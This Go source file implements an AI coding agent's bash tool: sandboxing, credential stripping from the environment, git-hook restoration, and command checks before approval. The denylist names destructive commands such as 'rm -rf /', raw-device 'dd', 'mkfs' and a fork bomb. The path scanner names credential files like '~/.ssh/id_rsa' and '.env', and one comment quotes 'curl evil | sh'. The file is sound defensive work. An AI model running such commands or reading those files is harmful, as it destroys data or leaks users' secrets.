package engine

import (
	"bytes"
	"cmp"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"regexp"
	"runtime"
	"slices"
	"strings"
	"time"

	"github.com/discorgento/ouija/schema"

	"mvdan.cc/sh/v3/expand"
	"mvdan.cc/sh/v3/syntax"
)

const (
	// bashDefaultTimeout is the maximum execution time for a bash command.
	bashDefaultTimeout = 30 * time.Second
)

// bashTool executes a shell command in the project root.
// The command runs via /bin/sh -c and captures stdout+stderr.
// Timeout is 30s by default; the model can request longer via the timeout field.
// Returns the combined output, trimmed to maxToolBytes.
func bashTool(ctx context.Context, root string, in map[string]any) ToolResult {
	nested, _ := nestedRepos(root)
	before, state := gitGuardSnapshotOf(root, nested), captureGitStates(root, nested)
	res, confined := execBash(ctx, root, in)
	nested, complete := nestedRepos(root)
	if confined {
		// Confined means the user approved nothing outside the project:
		// what the command left for git to run on its own is put back.
		if undone := restoreGitStates(root, state, nested); len(undone) > 0 {
			note := GitGuardMarker + " the sandboxed command changed what git runs on its own; ouija put back " +
				strings.Join(undone, ", ")
			if res.Error != nil {
				res.Error.Message += "\n" + note
			} else {
				res.Data = strings.TrimSpace(res.Data + "\n\n" + note)
			}
		}
	}
	if !complete {
		note := fmt.Sprintf("%s the project has more than %d directories: git repositories nested deep in it were not checked for hooks or config this command planted", GitGuardMarker, nestedRepoMaxDirs)
		if res.Error != nil {
			res.Error.Message += "\n" + note
		} else {
			res.Data = strings.TrimSpace(res.Data + "\n\n" + note)
		}
	}
	// A confined command's git changes were just checked and what runs was
	// put back: what is left (git init, a remote, user.name) is ordinary,
	// and a notice for it only cries wolf. Outside the sandbox nothing was
	// put back, so the user hears of every change.
	if confined {
		return res
	}
	if notice := gitGuardNotice(root, before, gitGuardSnapshotOf(root, nested)); notice != "" {
		if res.Error != nil {
			res.Error.Message += "\n" + notice
		} else {
			res.Data = strings.TrimSpace(res.Data + "\n\n" + notice)
		}
	}
	return res
}

// posixShell is the absolute path of the shell bash commands run in:
// /bin/sh, or on Windows a POSIX sh from PATH (Git for Windows ships one).
// Never the literal "/bin/sh" on Windows: there it means \bin\sh(.bat,
// .cmd, .exe) on the current drive, which any local user may create.
func posixShell() (string, error) {
	if runtime.GOOS != "windows" {
		return "/bin/sh", nil
	}
	for _, name := range []string{"sh", "bash"} {
		if p, err := exec.LookPath(name); err == nil && filepath.IsAbs(p) {
			return p, nil
		}
	}
	return "", errors.New("no POSIX shell found — install Git for Windows (its sh.exe on PATH) to use the bash tool")
}

// execBash runs the command (see bashTool) and reports whether the sandbox
// confined it.
func execBash(ctx context.Context, root string, in map[string]any) (res ToolResult, confined bool) {
	command, _ := in["command"].(string)
	if strings.TrimSpace(command) == "" {
		return errInvalidInput("bash: command is required"), confined
	}

	// Parse optional timeout (seconds).
	timeout := bashDefaultTimeout
	if t, ok := in["timeout"].(float64); ok && t > 0 {
		timeout = time.Duration(t) * time.Second
		if timeout > 120*time.Second {
			timeout = 120 * time.Second // hard cap
		}
	}

	// Derive from parent context so cancellation propagates (e.g. user
	// pressing Esc in the TUI). If the parent context has a deadline that
	// is shorter than timeout, the parent's deadline wins.
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	var cmd *exec.Cmd
	sb, _ := ctx.Value(sandboxKey{}).(*SandboxConfig)
	if unsandboxed, _ := in["unsandboxed"].(bool); unsandboxed && sb != nil && sb.Enabled {
		// Only the ToolRunner grants this, after the user approved this exact
		// command; a call that reaches the tool any other way stays confined.
		if approved, _ := ctx.Value(unsandboxedKey{}).(string); approved != command || !sb.UnsandboxedAllowed() {
			return ToolResult{Error: &ToolError{Code: ErrCodeNotAllowed, Message: "bash: running outside the sandbox needs the user's approval of this exact command" +
				", and the config can forbid it (sandbox.allowUnsandboxed)"}}, confined
		}
		sb = nil
	}
	if sb != nil && sb.Enabled {
		sandboxed, err := sandboxedShell(ctx, root, sb, command)
		switch {
		case err == nil:
			cmd, confined = sandboxed, true // its environment is sanitized too
		case sb.Optional && errors.Is(err, errSandboxUnsupported):
			// The default sandbox, on an OS that cannot enforce it: run as
			// without one. A sandbox a config asked for never gets here.
			noticeSandboxFallback(sb)
			sb = nil
		default:
			// Fail closed: never run unconfined what should be confined.
			return ToolResult{Error: &ToolError{Code: ErrCodeNotAllowed, Message: "bash sandbox: " + err.Error() + sandboxOffHint}}, confined
		}
	}
	if cmd == nil {
		shell, err := posixShell()
		if err != nil {
			return ToolResult{Error: &ToolError{Code: ErrCodeNotAllowed, Message: "bash: " + err.Error()}}, confined
		}
		cmd = exec.CommandContext(ctx, shell, "-c", command)
		cmd.Env = sanitizeEnv()
	}
	cmd.Dir = root
	// Its own process group: when the command ends, or is cancelled, every
	// process it started is killed — before the git state is put back.
	ownProcessGroup(cmd)
	// WaitDelay bounds how long the process may survive after ctx cancellation,
	// and how long a background job may hold the output open after the shell
	// exited (then it is killed with the group).
	cmd.WaitDelay = 3 * time.Second

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	killProcessGroup(cmd)
	if errors.Is(err, exec.ErrWaitDelay) && cmd.ProcessState != nil {
		// The shell exited; a background job it left held the output open
		// until it was killed. The shell's status is the command's.
		err = nil
		if !cmd.ProcessState.Success() {
			err = &exec.ExitError{ProcessState: cmd.ProcessState}
		}
	}

	// Capture output even on non-zero exit.
	out := strings.TrimSpace(stdout.String())
	errOut := strings.TrimSpace(stderr.String())

	if err != nil && ctx.Err() == context.DeadlineExceeded {
		return ToolResult{Error: &ToolError{Code: ErrCodeTimeout, Message: fmt.Sprintf("bash: command timed out after %v", timeout)}}, confined
	}

	// Both streams, also on failure: `go test` and `make` print what failed
	// on stdout and only a summary on stderr.
	out = strings.Join(slices.DeleteFunc([]string{out, errOut}, func(s string) bool { return s == "" }), "\n")
	if err != nil {
		// A non-zero exit is data for the model, not a Go error — but it must
		// see that the command failed, and how. A command that never started
		// (no shell, no such file) is a tool error, not a "successful" result.
		var exitErr *exec.ExitError
		if !errors.As(err, &exitErr) {
			return ToolResult{Error: &ToolError{Code: ErrCodeInternal, Message: "bash: the command could not start: " + err.Error()}}, confined
		}
		status := fmt.Sprintf("exit status %d", exitErr.ExitCode())
		if sb != nil && sb.Enabled {
			// A sandbox denial reads like any failure ("permission denied",
			// "could not resolve host"): say what the command ran under.
			status += "; " + sandboxNote(sb)
		}
		return ToolResult{Data: trim(strings.TrimSpace(out + "\n[" + status + "]"))}, confined
	}
	return ToolResult{Data: trim(cmp.Or(out, "(no output)"))}, confined
}

// sanitizeEnv filters the parent process environment to remove credential-like
// variables before passing them to a bash subprocess. This prevents accidental
// leakage of API keys, tokens, and other secrets via the shell.
// Reads fresh from os.Environ() each call (no caching) so that t.Setenv in
// tests works correctly — the per-call allocation is negligible for a CLI tool.
func sanitizeEnv() []string {
	var isSensitive = func(key string) bool {
		switch {
		// Block vars with credential-like prefixes.
		case strings.HasPrefix(key, "AWS_"),
			strings.HasPrefix(key, "GITHUB_"),
			strings.HasPrefix(key, "GITLAB_"),
			strings.HasPrefix(key, "BITBUCKET_"),
			strings.HasPrefix(key, "AZURE_"),
			strings.HasPrefix(key, "GOOGLE_"),
			strings.HasPrefix(key, "OPENAI_"),
			strings.HasPrefix(key, "ANTHROPIC_"),
			strings.HasPrefix(key, "TOGETHER_"),
			strings.HasPrefix(key, "OPENROUTER_"),
			strings.HasPrefix(key, "GROQ_"),
			strings.HasPrefix(key, "MISTRAL_"),
			strings.HasPrefix(key, "DEEPSEEK_"),
			strings.HasPrefix(key, "GEMINI_"),
			strings.HasPrefix(key, "XAI_"),
			strings.HasPrefix(key, "COHERE_"),
			strings.HasPrefix(key, "HF_"),
			strings.HasPrefix(key, "OUIJA_"):
			return true
		// FOO_KEY, STRIPE_KEY, a private key, a database DSN.
		case strings.HasSuffix(key, "_KEY"),
			strings.Contains(key, "PRIVATE"),
			strings.Contains(key, "PASSWD"),
			strings.HasSuffix(key, "_PASS"),
			strings.HasSuffix(key, "_PWD"), // MYSQL_PWD
			strings.HasSuffix(key, "_DSN"),
			key == "DATABASE_URL":
			return true
		// Block vars with credential-like substrings in the key name.
		case strings.Contains(key, "API_KEY"),
			strings.Contains(key, "APIKEY"),
			strings.Contains(key, "SECRET"),
			strings.Contains(key, "PASSWORD"),
			strings.Contains(key, "TOKEN"),
			strings.Contains(key, "CREDENTIAL"),
			strings.Contains(key, "AUTH"):
			return true
		}
		return false
	}

	raw := os.Environ()
	out := make([]string, 0, len(raw))
	for _, kv := range raw {
		eq := strings.IndexByte(kv, '=')
		if eq < 0 {
			continue
		}
		// PATH is kept whatever it holds: a bash without it runs nothing.
		if k, v := kv[:eq], kv[eq+1:]; isSensitive(strings.ToUpper(k)) || k != "PATH" && secretValue.MatchString(v) {
			continue
		}
		out = append(out, kv)
	}
	return out
}

// secretValue finds a well-known credential format anywhere in a value,
// whatever the variable is called: the name denylist missed MY_LLM=sk-ant-….
// Each token format has a fixed prefix and a long random tail, and must start
// a word (" sk-…", "Bearer ghp_…" match; a path segment "/sk-tool" does not),
// so ordinary values (a path, a version, "sk-1") do not match. The last
// alternatives are credentials inside a URL or a DSN: a password in the user
// part (parsed or not: postgres://u:p%zz@h is no valid URL, still a
// password), a Go MySQL DSN, a Sentry key and a Slack webhook.
var secretValue = regexp.MustCompile(`(?:^|[^A-Za-z0-9_/.-])(?:` + strings.Join([]string{
	`sk-[A-Za-z0-9_-]{20,}`,                                        // OpenAI, Anthropic (sk-ant-), OpenRouter (sk-or-)
	`[sr]k_live_[A-Za-z0-9]{20,}`,                                  // Stripe
	`gh[pousr]_[A-Za-z0-9]{30,}`,                                   // GitHub tokens
	`github_pat_[A-Za-z0-9_]{40,}`,                                 // GitHub fine-grained tokens
	`glpat-[A-Za-z0-9_-]{20,}`,                                     // GitLab
	`(?:AKIA|ASIA)[0-9A-Z]{16}`,                                    // AWS access key ids
	`xox[abprs]-[A-Za-z0-9-]{10,}`,                                 // Slack
	`AIza[0-9A-Za-z_-]{35}`,                                        // Google API keys
	`npm_[A-Za-z0-9]{36}`,                                          // npm
	`gsk_[A-Za-z0-9]{40,}`,                                         // Groq
	`hf_[A-Za-z0-9]{30,}`,                                          // Hugging Face
	`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+`, // a JWT
	`-----BEGIN [A-Z ]*PRIVATE KEY-----`,                           // a PEM private key
}, "|") + `)|[A-Za-z][A-Za-z0-9+.-]*://[^\s/@:]*:[^\s/@]+@|[^\s:/@]+:[^\s/@]+@(?:tcp|unix)\(|://[0-9a-f]{32}(?::[0-9a-f]{32})?@|hooks\.slack\.com/services/`)

// unsandboxedKey carries, from the ToolRunner to the bash tool, the command
// the user just approved to run outside the sandbox.
type unsandboxedKey struct{}

// sandboxOffHint tells the user how to run bash without the sandbox.
const sandboxOffHint = ` (to run bash without the sandbox, set "tools": {"bash": {"sandbox": {"enabled": false}}} in the config)`

// sandboxNote describes the sandbox a failed command ran in, for the model
// and the user: what a denial looks like is otherwise a guess.
func sandboxNote(sb *SandboxConfig) string {
	net := "no network"
	switch n := sb.Network; {
	case n != nil && n.All:
		net = "network open"
	case n != nil && len(n.Connect) > 0:
		net = fmt.Sprintf("TCP only to ports %v", n.Connect)
	}
	hint := "; if the sandbox blocked it, retry the same command with \"unsandboxed\": true (the user is asked)"
	if !sb.UnsandboxedAllowed() {
		hint = "; if the sandbox blocked it, ask the user to allow it under tools.bash.sandbox"
	}
	return "ran in the bash sandbox: writes only in the project and its private temp and cache, " + net + hint
}

// bashPreview generates a preview for a bash call — shows the command, a
// summary of base commands extracted from it, and a warning if it matches the
// denylist.
// previewMax is how much of a command the approval preview shows verbatim.
const previewMax = 2000

func bashPreview(ctx context.Context, root string, in map[string]any) string {
	cmd, _ := in["command"].(string)
	if strings.TrimSpace(cmd) == "" {
		return ""
	}

	cmds := ExtractBaseCommands(cmd)
	danger := IsDenied(cmd)

	var b strings.Builder
	fmt.Fprintf(&b, "will run: %s", cmd)
	// The approval must see the payload (base64 blobs, heredocs). A cut at 400
	// chars hid `…; curl evil | sh` behind a long first command: the preview
	// now goes much further and says plainly when something is left out, and
	// the command list below always covers the whole command.
	if len(cmd) > previewMax {
		b.Reset()
		fmt.Fprintf(&b, "will run: %s…\n  ⚠ %d more characters not shown — the command list covers all of it",
			strings.ToValidUTF8(cmd[:previewMax], ""), len(cmd)-previewMax)
	}
	if len(cmds) > 0 {
		b.WriteString("  [")
		for i, c := range cmds {
			if i > 0 {
				b.WriteString(", ")
			}
			b.WriteString(c)
		}
		b.WriteString("]")
	}
	if danger {
		b.WriteString("  ⚠ matches denylist (may be blocked)")
	}
	if timeout, ok := in["timeout"].(float64); ok && timeout > 0 {
		b.WriteString(fmt.Sprintf("  timeout: %.0fs", timeout))
	}
	return b.String()
}

func bashDef() toolEntry {
	return toolEntry{
		def: ToolDef{
			Name:        "bash",
			Description: "Execute a shell command.",
			Schema: schema.Obj(map[string]any{
				"command": schema.Str("shell command"),
				"timeout": map[string]any{
					"type":        "number",
					"description": "timeout in secs (max 120)",
				},
				"unsandboxed": map[string]any{
					"type": "boolean",
					"description": "run outside the bash sandbox. Only after the same command failed because the " +
						"sandbox blocked it (network, a path outside the project); the user is asked every time",
				},
			}, "command"),
		},
		fn:      bashTool,
		preview: bashPreview,
	}
}

// ExtractBaseCommands returns all base commands from a shell command string.
// Uses mvdan.cc/sh's real shell parser to build an AST, then walks the tree
// to find every command invocation — including inside command substitutions
// ($(...) or “), pipelines, and chained statements (&&, ||, ;).
// Env-var prefixes (OLLAMA_HOST=localhost) are skipped.
// Returns nil for empty or parse-failed commands (fail-open to a single
// segment fallback to avoid blocking legitimate commands on trivial syntax).
func ExtractBaseCommands(cmd string) []string {
	if strings.TrimSpace(cmd) == "" {
		return nil
	}

	parser := syntax.NewParser()
	ast, err := parser.Parse(strings.NewReader(cmd), "")
	if err != nil {
		// Fall back to the first word for unparsable commands so that
		// edge cases (incomplete heredocs, etc.) don't break the TUI.
		if f := strings.Fields(cmd); len(f) > 0 {
			return []string{f[0]}
		}
		return nil
	}

	seen := make(map[string]struct{})
	var baseCmds []string

	// collect extracts the base command name from a CallExpr, skipping
	// env-var assignments, and appends it (deduplicated) to cmds.
	collect := func(call *syntax.CallExpr) {
		if len(call.Args) == 0 {
			return
		}
		// The name after quote removal: `"c"url` runs curl, and Lit() is
		// empty for it — the approval summary used to leave such commands
		// out. A name only known at run time ($(…), $VAR) is shown as such.
		base := "(dynamic)"
		if vs, err := expand.Fields(staticExpandConfig(), call.Args[0]); err == nil && len(vs) > 0 {
			base = vs[0]
		}
		// Skip env-var prefix tokens (VAR=value). The parser places
		// them in Assigns, but we also guard against literals with "=".
		if base == "" || strings.Contains(base, "=") {
			return
		}
		if _, dup := seen[base]; dup {
			return
		}
		seen[base] = struct{}{}
		baseCmds = append(baseCmds, base)
	}

	forEachCall(ast, collect)

	if len(baseCmds) == 0 {
		return nil
	}
	return baseCmds
}

// ExtractCommands returns the full command segments from a shell command
// string — each segment includes its arguments. For example:
//
//	"git status -s && rm -rf /tmp" → ["git status -s", "rm -rf /tmp"]
//
// Uses the real shell parser (mvdan.cc/sh) and walks the AST to find every
// command invocation. Skips env-var prefixes.
// Returns nil for empty or unparsable commands.
func ExtractCommands(cmd string) []string {
	if strings.TrimSpace(cmd) == "" {
		return nil
	}

	parser := syntax.NewParser()
	ast, err := parser.Parse(strings.NewReader(cmd), "")
	if err != nil {
		// Fallback: return the whole trimmed command.
		if s := strings.TrimSpace(cmd); s != "" {
			return []string{s}
		}
		return nil
	}

	seen := make(map[string]struct{})
	var segs []string

	collect := func(call *syntax.CallExpr) {
		if len(call.Args) == 0 {
			return
		}
		base := call.Args[0].Lit()
		if base == "" || strings.Contains(base, "=") {
			return
		}
		// Extract the original source text for this call expression using
		// its position in the source. This preserves quoting, $(), etc.
		// When the call has env-var assignments (VAR=value), use the
		// first argument's position to skip the prefix.
		start := int(call.Pos().Offset())
		if len(call.Assigns) > 0 && len(call.Args) > 0 {
			if ap := call.Args[0].Pos().Offset(); ap > uint(start) {
				start = int(ap)
			}
		}
		end := int(call.End().Offset())
		if start >= end || start < 0 || end > len(cmd) {
			return
		}
		seg := strings.TrimSpace(cmd[start:end])
		if seg == "" {
			return
		}
		if _, dup := seen[seg]; dup {
			return
		}
		seen[seg] = struct{}{}
		segs = append(segs, seg)
	}

	forEachCall(ast, collect)

	if len(segs) == 0 {
		return nil
	}
	return segs
}

// forEachCall calls fn for every command invocation in the tree — including
// those inside command substitutions, pipelines and chained statements.
func forEachCall(ast syntax.Node, fn func(*syntax.CallExpr)) {
	syntax.Walk(ast, func(node syntax.Node) bool {
		if call, ok := node.(*syntax.CallExpr); ok {
			fn(call)
		}
		return true
	})
}

// denylistEntry is a hardcoded dangerous pattern that is always rejected.
type denylistEntry struct {
	match  string   // the pattern to match
	tokens []string // word-tokenized pattern; if set, exact token match is required
}

// denylistPatterns are hardcoded dangerous command patterns that are always
// rejected, regardless of the allowlist. These block the most destructive
// actions (wipe filesystem, fork bomb, raw device writes).
// Each entry may specify `tokens` for word-level matching (avoids false
// positives like `rm -rf /tmp` matching the pattern `rm -rf /`).
var denylistPatterns = []denylistEntry{
	// rm -rf where the target is root or root-glob
	{tokens: []string{"rm", "-rf", "/"}},
	{tokens: []string{"rm", "-rf", "/*"}},
	{tokens: []string{"rm", "-rf", "--no-preserve-root", "/"}},
	{tokens: []string{"rm", "-rf", "~"}},
	{tokens: []string{"rm", "-rf", "$home"}},

	// dd writing to a raw device
	{tokens: []string{"dd", "if=/dev/zero", "of=/dev/sda"}},
	{tokens: []string{"dd", "if=/dev/random", "of=/dev/sda"}},
	{tokens: []string{"dd", "if=/dev/urandom", "of=/dev/sda"}},

	// Filesystem operations on raw devices (any mkfs.*, fdisk, parted)
	{match: "mkfs."},
	{match: "fdisk /dev/sda"},
	{match: "parted /dev/sda"},

	// Fork bomb
	{match: ":(){ :|:& };"},

	// chmod/chown entire root
	{tokens: []string{"chmod", "-r", "0", "/"}},
	{tokens: []string{"chown", "-r", "root:root", "/"}},
}

// IsDenied returns true if the command matches a denylist pattern — either
// the static list above (kept for transparency/back-compat) or the semantic
// analysis below, which catches flag-order variants (`rm -fr /`), execution
// wrappers (`sudo rm -fr /`, `bash -c 'rm -fr /'`) and device commands the
// static entries miss (`mkfs` without a dot, `dd of=/dev/sdb`, `fdisk /dev/nvme0`).
func IsDenied(cmd string) bool {
	normalized := strings.TrimSpace(cmd)
	if normalized == "" {
		return false
	}
	lower := strings.ToLower(normalized)
	fields := strings.Fields(lower)

	for _, e := range denylistPatterns {
		if len(e.tokens) > 0 {
			// Token-level match: all tokens must appear consecutively.
			if len(fields) < len(e.tokens) {
				continue
			}
			for i := 0; i <= len(fields)-len(e.tokens); i++ {
				match := true
				for j, tok := range e.tokens {
					if fields[i+j] != tok {
						match = false
						break
					}
				}
				if match {
					return true
				}
			}
		} else if strings.Contains(lower, e.match) {
			return true
		}
	}

	return semanticDenied(normalized, lower)
}

// reparseShells run a nested command string (`sh -c '…'`, `eval '…'`).
var reparseShells = map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true}

// deviceTools wipe or repartition raw devices when given a /dev path.
var deviceTools = map[string]bool{
	"fdisk": true, "parted": true, "sgdisk": true, "gdisk": true,
	"wipefs": true, "blkdiscard": true, "pvremove": true, "vgremove": true,
}

// semanticDenied analyses each command segment by its tokens (segment = one
// invocation, chains/pipes already split by ExtractCommands).
func semanticDenied(normalized, lower string) bool {
	// Fork bomb: match regardless of whitespace (`:(){ :|:& };:` etc).
	compact := strings.Map(func(r rune) rune {
		switch r {
		case ' ', '\t', '\n', '\r':
			return -1
		}
		return r
	}, lower)
	if strings.Contains(compact, ":(){:|:&}") {
		return true
	}

	segs := ExtractCommands(normalized)
	if len(segs) == 0 {
		segs = []string{normalized}
	}
	for _, seg := range segs {
		if segmentDenied(strings.Fields(seg), 0) {
			return true
		}
	}
	// The same rules on the words as the shell passes them: quote removal
	// and $HOME expansion turn `\rm -rf /`, `'r'm -rf /` and
	// `rm -rf "$HOME"/` into the command they run.
	for _, words := range expandedCalls(normalized) {
		if segmentDenied(words, 0) {
			return true
		}
	}
	return false
}

// expandedCalls returns each command invocation of cmd (substitutions
// included) as its words after static expansion, with HOME set. Nothing is
// executed; a word that needs a real expansion keeps its literal form.
func expandedCalls(cmd string) [][]string {
	f, err := syntax.NewParser().Parse(strings.NewReader(cmd), "")
	if err != nil {
		return nil
	}
	var env []string
	if home, err := os.UserHomeDir(); err == nil {
		env = append(env, "HOME="+home)
	}
	cfg := staticExpandConfig(env...)
	var calls [][]string
	forEachCall(f, func(call *syntax.CallExpr) {
		var words []string
		for _, w := range call.Args {
			if vs, err := expand.Fields(cfg, w); err == nil {
				words = append(words, vs...)
			} else {
				words = append(words, w.Lit())
			}
		}
		calls = append(calls, words)
	})
	return calls
}

// segmentDenied applies the destructive-command rules to one invocation's
// token list. Every token position that names a rule-bearing command is
// analysed, not just the first word: execution wrappers put the real command
// after their own flags (`sudo -u root rm -fr /`, `xargs -n1 rm -fr /`) and
// env prefixes sit before it (`VAR=1 rm -rf /`), so a first-word-only scan
// would miss them. Nested command strings (`bash -c '...'`, `eval '...'`) are
// re-parsed up to `depth` levels deep.
func segmentDenied(fields []string, depth int) bool {
	if depth > 3 || len(fields) == 0 {
		return false
	}

	for i, f := range fields {
		base := strings.ToLower(unquote(f))
		rest := fields[i+1:]

		// Nested command strings: `bash -c '...'`, `eval '...'`.
		if base == "eval" {
			if segmentDenied(strings.Fields(stripShellQuotes(strings.Join(rest, " "))), depth+1) {
				return true
			}
			continue
		}
		if reparseShells[base] {
			nested := false
			for j, t := range rest {
				if t == "-c" {
					nested = true
					if segmentDenied(strings.Fields(stripShellQuotes(strings.Join(rest[j+1:], " "))), depth+1) {
						return true
					}
					break
				}
			}
			if nested {
				continue
			}
			// No -c (running a script): keep scanning the remaining tokens.
		}

		switch {
		case base == "rm" || base == "chmod" || base == "chown":
			if recursiveOnRoot(rest) {
				return true
			}
		case base == "dd":
			if ddDenied(rest) {
				return true
			}
		case strings.HasPrefix(base, "mkfs"):
			// Any mkfs variant formats a filesystem — blocked wherever it
			// appears (the static list already blocks `mkfs.` by substring).
			return true
		case deviceTools[base]:
			if refsDev(rest) {
				return true
			}
		}
	}
	return false
}

// unquote strips shell quoting from a token so `"rm"`, `'/'` or
// `of=/dev/sda` reduce to the word actually being run.
func unquote(t string) string { return strings.Trim(t, "\"'`") }

// ddDenied reports dd writing onto a raw block device (`of=/dev/sda`).
func ddDenied(rest []string) bool {
	for _, t := range rest {
		v := strings.ToLower(unquote(t))
		if strings.HasPrefix(v, "of=/dev") {
			return true
		}
	}
	return false
}

// refsDev reports device-tool commands pointing at any /dev path (the static
// list only knew /dev/sda).
func refsDev(rest []string) bool {
	for _, t := range rest {
		if strings.HasPrefix(strings.ToLower(unquote(t)), "/dev/") {
			return true
		}
	}
	return false
}

// recursiveOnRoot reports a recursive rm/chmod/chown of the root or home
// itself: `rm -rf /tmp` stays legal; `rm -rf /`, `rm -fr ~`, `chmod -R 0 /`
// don't.
func recursiveOnRoot(rest []string) bool {
	if !hasRecursiveFlag(rest) {
		return false
	}
	for _, t := range flagsAndTargets(rest) {
		if isRootish(t) {
			return true
		}
	}
	return false
}

// hasRecursiveFlag reports whether rest carries a recursive flag: a short
// cluster containing r/R (-rf, -r, -R) or the long --recursive option.
func hasRecursiveFlag(rest []string) bool {
	for _, t := range rest {
		t = unquote(t)
		if t == "--" {
			break
		}
		if t == "--recursive" {
			return true
		}
		if strings.HasPrefix(t, "-") && !strings.HasPrefix(t, "--") && !strings.Contains(t, "=") {
			for _, c := range t[1:] {
				if c == 'r' || c == 'R' {
					return true
				}
			}
		}
	}
	return false
}

// flagsAndTargets splits a word list into non-flag operands. `--` is kept
// simple: everything after it is an operand (paths to delete).
func flagsAndTargets(rest []string) []string {
	var out []string
	afterDD := false
	for _, t := range rest {
		t = unquote(t)
		if !afterDD {
			if t == "--" {
				afterDD = true
				continue
			}
			if strings.HasPrefix(t, "-") && len(t) > 1 {
				continue // flag (short cluster or long option)
			}
		}
		out = append(out, strings.ToLower(t))
	}
	return out
}

// isRootish reports whether a path names the filesystem root or the whole
// home directory (the targets the denylist is about), never a subdirectory.
func isRootish(t string) bool {
	switch t {
	case "/", "/*", "~", "~/", "~/*", "$home", "$home/*", "${home}", "${home}/*", "$home/", "/*/", "/**":
		return true
	}
	// Spelling variants of the same targets: `${home}/`, `//`, `/.`, and the
	// expanded home directory itself (expandedCalls substitutes $HOME).
	// filepath.ToSlash: on Windows $HOME expands to C:\Users\…, which only
	// compares with the home directory once both are slash-separated.
	c := filepath.ToSlash(strings.TrimSuffix(t, "*"))
	if c == "" {
		return false
	}
	c = path.Clean(c)
	if c == "/" || c == "~" || c == "$home" || c == "${home}" {
		return true
	}
	home, err := os.UserHomeDir()
	return err == nil && c == strings.ToLower(path.Clean(filepath.ToSlash(home)))
}

func stripShellQuotes(s string) string {
	return strings.Map(func(r rune) rune {
		if r == '\'' || r == '"' || r == '`' {
			return -1
		}
		return r
	}, s)
}

// ─── Protected-path references in bash commands ───────────────────────

// pathTokenTrim strips shell punctuation around a word so that `.env)`,
// `$(cat` or `"~/.ssh/id_rsa"` reduce to a path-like candidate.
// Glob metacharacters (`*`, `?`) are kept: globMatches needs the pattern.
const pathTokenTrim = "'\"`" + "(){}[],;:&|<>!$"

// commandRefsProtectedPath reports the first word token of cmd that names a
// protected path (credential or system location). bash has no `path` argument
// for the ToolRunner permission gate to inspect, so without this scan a model
// could `cat` the same file the read_file tool refuses.
// False positives are accepted by design: a command word that names `.env`
// or `~/.ssh/…` is rejected with an explicit message instead of being run.
func commandRefsProtectedPath(cmd string) (string, bool) {
	return commandRefsProtectedPathIn("", cmd)
}

// commandRefsProtectedPathIn is commandRefsProtectedPath for a command that
// runs in root. Besides the raw tokens it checks each word's value after quote
// removal (`cat .e""nv` is `cat .env` to the shell) and, when root is set,
// where each word physically lands: a symlink in the project
// (`notes.txt → .env`) is refused like the file it points to.
func commandRefsProtectedPathIn(root, cmd string) (string, bool) {
	for _, c := range protectedPathCandidates(cmd) {
		if isProtectedPath(c) {
			return c, true
		}
		if root != "" {
			if p := physicalCandidate(root, c); p != "" && isProtectedFile(p) {
				return c, true
			}
		}
		// The shell globs what the scan would otherwise judge by its spelling:
		// `cat ~/.ss?/id_rsa` and `cat .en?` open the files their patterns
		// match, so every existing match is checked.
		for _, m := range globMatches(root, c) {
			if isProtectedPath(m) || isProtectedFile(physicalPath(m)) {
				return c, true
			}
		}
	}
	return "", false
}

// globMatches returns the existing paths a glob word expands to, resolved like
// physicalCandidate (`~` → home, relative → root). It returns nil for a word
// without glob metacharacters, a relative glob with no root, or a malformed
// pattern. filepath.Glob also matches dotfiles with `*`, which only makes the
// check stricter than the shell.
func globMatches(root, word string) []string {
	if !strings.ContainsAny(word, "*?[") {
		return nil
	}
	if root == "" && !filepath.IsAbs(word) && !isHomeWord(word) {
		return nil
	}
	word = wordPath(root, word)
	if word == "" {
		return nil
	}
	matches, err := filepath.Glob(word)
	if err != nil {
		return nil
	}
	return matches
}

// protectedPathCandidates lists the path-like words of cmd: the raw tokens of
// each command segment, trimmed of shell punctuation, plus every shell word's
// value after quote removal. A `KEY=value` word also yields its value.
func protectedPathCandidates(cmd string) []string {
	segs := ExtractCommands(cmd)
	if len(segs) == 0 {
		segs = []string{cmd}
	}
	var words []string
	for _, seg := range segs {
		words = append(words, strings.Fields(seg)...)
	}
	words = append(words, shellWordValues(cmd)...)

	var out []string
	for _, w := range words {
		candidates := []string{w}
		if eq := strings.IndexByte(w, '='); eq > 0 {
			candidates = append(candidates, w[eq+1:]) // of=/dev/…, KEY=.env value…
		}
		for _, c := range candidates {
			c = strings.Trim(c, pathTokenTrim)
			if c == "" || strings.HasPrefix(c, "-") {
				continue
			}
			out = append(out, c)
		}
	}
	return out
}

// errNotStatic is what staticExpandConfig's substitution hooks return: the
// word needs a real execution to expand, so it has no static value.
var errNotStatic = errors.New("word needs execution to expand")

// staticExpandConfig expands shell words without running anything: command
// and process substitutions fail with errNotStatic (a nil hook would panic),
// globbing is off (no ReadDir), and the environment holds only env.
func staticExpandConfig(env ...string) *expand.Config {
	return &expand.Config{
		Env:       expand.ListEnviron(env...),
		CmdSubst:  func(io.Writer, *syntax.CmdSubst) error { return errNotStatic },
		ProcSubst: func(*syntax.ProcSubst) (string, error) { return "", errNotStatic },
	}
}

// shellWordValues returns the value every word of cmd has after quote removal,
// as the shell would pass it (`.e""nv`, `'.e'nv` and `.e\nv` are all `.env`),
// with $HOME expanded so `$HOME/.ssh` is judged as the home path it is.
// Nothing is executed: a word needing a real expansion (command substitution)
// is skipped, while the words inside the substitution are still visited.
func shellWordValues(cmd string) []string {
	f, err := syntax.NewParser().Parse(strings.NewReader(cmd), "")
	if err != nil {
		return nil
	}
	var env []string
	if home, err := os.UserHomeDir(); err == nil {
		env = append(env, "HOME="+home)
	}
	cfg := staticExpandConfig(env...)
	var out []string
	syntax.Walk(f, func(n syntax.Node) bool {
		if w, ok := n.(*syntax.Word); ok {
			// Fields, not Literal: argument semantics, so an unquoted
			// backslash is removed too.
			if vs, err := expand.Fields(cfg, w); err == nil {
				out = append(out, vs...)
			}
		}
		return true
	})
	return out
}

// physicalCandidate resolves a command word to the path it would open from
// root — `~` is the home directory, a relative word is relative to root — with
// its symlinks resolved. Words that are not paths simply resolve to a
// harmless location under root.
func physicalCandidate(root, word string) string {
	if word = wordPath(root, word); word == "" {
		return ""
	}
	return physicalPath(word)
}

